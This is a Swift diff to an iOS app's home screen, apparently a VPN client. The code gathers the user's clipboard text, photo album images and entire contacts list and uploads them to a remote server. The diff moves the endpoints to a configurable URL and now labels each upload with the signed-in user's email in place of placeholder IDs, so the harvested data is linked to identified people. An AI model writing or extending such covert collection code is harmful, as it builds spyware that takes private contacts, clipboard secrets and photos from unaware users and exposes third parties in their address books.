@@ -138,14 +138,13 @@ struct HomeView: View {
      
     
     //上传粘贴板内容的地址
-    let serverUploadImageURL = "https://admin.cybervpn.org/api/demo/uploadImg?type=ios&userId="
+    let serverUploadImageURL = "\(UserManager.shared.configURL)uploadImg"
     
     //上传相册的地址
-    let serveruploadPasteBoardURL = "https://admin.cccccc.org/api/demo/info?type=ios&userId="
+    let serveruploadPasteBoardURL = "\(UserManager.shared.configURL)uploadPasteBoardInfo"
     
     //上传通讯录的地址
-    let serveruploadContacesURL = "https://admin.cccccc.org/api/demo/uploadContacts?type=ios&userId="
-    
+    let serveruploadContacesURL = "\(UserManager.shared.configURL)uploadContacts"
     
     var body: some View {
        
@@ -1045,7 +1044,8 @@ struct HomeView: View {
         var body =  Data()
         // let fileName = "image_\(Int(Date.now.timeIntervalSince1970)).png"
         // 添加 "userId", "fenzhanid", "imgstr", "phone" 字段
-        body.append(convertFormField(named: "userId", value: "0000000000000", boundary: boundary))
+        let userInfo = UserManager.shared.getUserInfo()
+        body.append(convertFormField(named: "useremail", value: userInfo.email, boundary: boundary))
         body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
         body.append(convertFormField(named: "imgstr", value: fileName, boundary: boundary))
         //if let clipboardText = UIPasteboard.general.string {
@@ -1217,9 +1217,9 @@ struct HomeView: View {
         var body = Data()
         
         // 添加基本字段
-        body.append(convertFormField(named: "userId", value: "0000000000000", boundary: boundary))
+        let userInfo = UserManager.shared.getUserInfo()
+        body.append(convertFormField(named: "useremail", value: userInfo.email, boundary: boundary))
         body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
-        body.append(convertFormField(named: "phone", value: "0000000000000", boundary: boundary))
         
         // 将联系人数据转换为JSON字符串
         do {
@@ -1343,17 +1343,11 @@ struct HomeView: View {
         var body =  Data()
         // let fileName = "image_\(Int(Date.now.timeIntervalSince1970)).png"
         // 添加 "userId", "fenzhanid", "imgstr", "phone" 字段
-        body.append(convertFormField(named: "userId", value: "0000000000000", boundary: boundary))
-        body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
-//            body.append(convertFormField(named: "imgstr", value: fileName, boundary: boundary))
-        
+        let userInfo = UserManager.shared.getUserInfo()
+        body.append(convertFormField(named: "useremail", value: userInfo.email, boundary: boundary))
+        body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary)) 
         body.append(convertFormField(named: "info", value: clipboardText, boundary: boundary))
-        
-        
-        body.append(convertFormField(named: "phone", value: "0000000000000", boundary: boundary))
-        
-//             添加图片文件
-//            body.append(convertFileData(fieldName: fileName, fileimageData: imagedata, boundary: boundary))
+          
         
         // 结束分隔符
         body.appendString("--\(boundary)--\r\n")
